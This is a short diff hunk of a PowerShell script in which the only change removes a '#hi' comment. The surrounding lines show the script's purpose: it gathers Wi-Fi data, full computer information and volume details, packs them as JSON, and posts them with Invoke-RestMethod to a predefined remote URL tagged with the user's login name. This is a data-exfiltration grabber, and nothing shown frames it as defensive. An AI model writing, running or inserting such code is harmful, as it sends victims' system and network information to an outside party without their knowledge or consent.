@@ -6,4 +6,3 @@ $info = Get-ComputerInfo | ConvertTo-Json | ConvertFrom-Json
 $vol = Get-Volume
 $data = New-Object -TypeName psobject -Property @{"wifi" = $wifi; "info" = $info; "Volume" = $vol} | ConvertTo-Json
 Invoke-RestMethod $url/$(whoami) -Method Post -Body $data #$url is predefined
-#hi
